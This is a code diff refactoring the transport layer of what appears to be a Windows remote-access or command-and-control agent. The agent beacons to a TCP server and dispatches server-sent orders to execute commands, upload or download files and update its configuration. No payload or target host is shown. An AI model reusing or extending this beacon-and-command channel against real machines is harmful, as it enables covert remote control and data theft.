@@ -8,13 +8,13 @@
 #include <iostream>
 #pragma comment(lib, "ws2_32.lib")
 
-inline bool Transporter::sendMessage(const InternalMessage& msg)
+bool Transporter::sendMessage(const InternalMessage& msg)
 {
     //auto serialized = serializer_.serialize(msg);
     //auto encoded = encoder_.encode(serialized);
     //auto encrypted = encryptor_.encrypt(encoded);
     //return send(encrypted);
-	return serializer_.serialize(msg);
+    return send(serializer_.serialize(msg));
 }
 
 InternalMessage Transporter::receiveMessage()
@@ -33,13 +33,13 @@ InternalMessage Transporter::receiveMessage()
 
 void Transporter::beacon()
 {
-    auto heartbeat = createHeartbeat();
-    sendMessage(heartbeat);
+    //auto heartbeat = createHeartbeat();
+    //sendMessage(heartbeat);
 
     auto incoming = receiveMessage();
     if (incoming.header.messageType != DEFAULT)
     {
-        handleIncomingMessage(incoming); // TODO: move this logic/function into MessageHandler? also, should this function return the result of a command so we have something to send back to the server??
+        messageHandler_.processMessage(incoming);
     }
 }
 
@@ -52,49 +52,15 @@ InternalMessage Transporter::createHeartbeat()
     return msg;
 }
 
-// TODO: move this logic/function into MessageHandler?
-void Transporter::handleIncomingMessage(InternalMessage& msg)
-{
-    switch (msg.header.messageType)
-    {
-    case MessageType::EXECUTE_COMMAND:
-        messageHandler_->executeCommand(msg.data);
-        //messageHandler_->executeCommand(msg.data, msg.header.messageId);
-        break;
-
-    case UPLOAD_FILE:
-        messageHandler_->uploadFile(msg.data);
-        break;
-
-    case DOWNLOAD_FILE:
-        messageHandler_->downloadFile(msg.data);
-        //messageHandler_->downloadFile(parseFilename(msg.data), msg.header.messageId);
-        break;
-
-    case CONFIG_UPDATE:
-        messageHandler_->updateConfig(msg.data);
-        break;
-
-    case ERROR_REPORT:
-        // Server sent an error, handle it
-        messageHandler_->handleServerError(msg.data);
-        break;
-    default:
-        std::cout << "default case, MessageType = " << msg.header.messageType << std::endl;
-    }
-}
-
 uint32_t Transporter::generateId()
 {
     return rand();
 }
 
 
-
-
-TCPTransporter::TCPTransporter(MessageHandler* hdlr, const std::string& server, uint16_t port)
-//TCPTransporter::TCPTransporter(MessageHandler* hdlr, const std::string& server, std::string port)
-    : Transporter(hdlr), server_(server), port_(port)
+//TCPTransporter::TCPTransporter(MessageHandler* hdlr, const std::string& server, uint16_t port)
+TCPTransporter::TCPTransporter(MessageHandler& messageHandler, const std::string& server, std::string port)
+    : Transporter(messageHandler), server_(server), port_(port)
 {
     initializeWinsock();
 }
@@ -114,6 +80,8 @@ bool TCPTransporter::initializeWinsock()
     
 }
 
+
+
 bool TCPTransporter::send(const std::vector<uint8_t>& data)
 {
     if (!connected_ && !connect()) return false;
@@ -124,7 +92,6 @@ bool TCPTransporter::send(const std::vector<uint8_t>& data)
 
 bool TCPTransporter::connect()
 {
-    std::cout << "inside connect" << std::endl;
     socket_ = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (socket_ == INVALID_SOCKET)
     {
@@ -161,7 +128,6 @@ bool TCPTransporter::connect()
     {
         if (::connect(socket_, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
         {
-            std::cout << "connected == true" << std::endl;
             connected_ = true;
             break;
         }
